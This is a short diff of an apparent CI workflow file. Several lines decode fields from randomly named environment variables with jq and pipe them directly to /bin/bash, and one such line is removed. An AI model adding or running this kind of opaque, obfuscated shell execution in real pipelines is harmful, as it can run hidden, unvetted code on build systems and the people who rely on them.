@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$mkk8809" | jq -r .x52 | /bin/bash
           echo $ae4 | jq -r .grh471 | /bin/bash
           echo $hbt5 | jq -r .kpavn828 | /bin/bash
-          echo $ptpng51 | jq -r .ank90418 | /bin/bash
           printf '%s' "$ppvd44518" | jq -r .vh89942 | /bin/bash
 
       - name: Archive results
